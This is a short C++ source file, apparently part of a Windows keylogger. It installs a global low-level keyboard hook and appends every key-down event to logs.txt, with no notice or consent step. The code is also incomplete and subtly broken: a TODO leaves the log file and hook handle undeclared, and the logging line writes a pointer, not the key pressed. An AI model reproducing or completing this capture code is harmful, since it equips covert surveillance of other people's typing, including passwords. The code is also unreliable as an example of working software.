#include "HookInput.h"
//TODO: logFile, keyboardHook
LRESULT HookInput::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT key = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION)
	{
		logFile << key;
	}
	return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void HookInput::startTracking(void* pParam)
{
	logFile.open("logs.txt", std::ios::app);
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, nullptr, NULL);
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0) != 0);
}

void HookInput::stopTracking()
{
	UnhookWindowsHookEx(keyboardHook);
}
